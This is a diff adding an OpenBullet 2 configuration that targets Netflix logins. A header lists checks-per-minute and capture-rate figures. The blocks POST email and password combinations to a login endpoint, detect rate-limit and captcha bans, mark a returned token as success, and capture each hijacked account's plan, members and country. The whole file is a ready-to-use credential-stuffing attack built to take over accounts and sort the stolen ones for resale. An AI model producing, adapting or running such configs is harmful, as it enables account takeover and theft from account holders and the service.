@@ -1,0 +1,33 @@
+# OpenBullet 2 config — Netflix OpenBullet v22
+# Target: Netflix   Tool: OpenBullet 2
+# Uploader: user #7
+# CPM: 1800   Capture rate: 0.28
+# ============================================================
+
+BLOCK:HttpRequest
+  url = "https://api.netflix.com/v1/auth/login"
+  method = POST
+  headers {
+    "User-Agent" = "<UA>"
+    "Content-Type" = "application/json"
+    "Accept" = "application/json"
+  }
+  body {
+    "{\"email\":\"<INPUT>\",\"password\":\"<PASS>\"}"
+  }
+ENDBLOCK
+
+BLOCK:Keycheck
+  banOn = "429"
+  banOn = "captcha"
+  successOn = "\"token\":\""
+  failureOn = "\"error\""
+ENDBLOCK
+
+BLOCK:Parse
+  "\"plan\":\"(.*?)\"" -> CAPTURE "Plan"
+  "\"members\":\"(.*?)\"" -> CAPTURE "Members"
+  "\"country\":\"(.*?)\"" -> CAPTURE "Country"
+ENDBLOCK
+
+# config-id: 108338
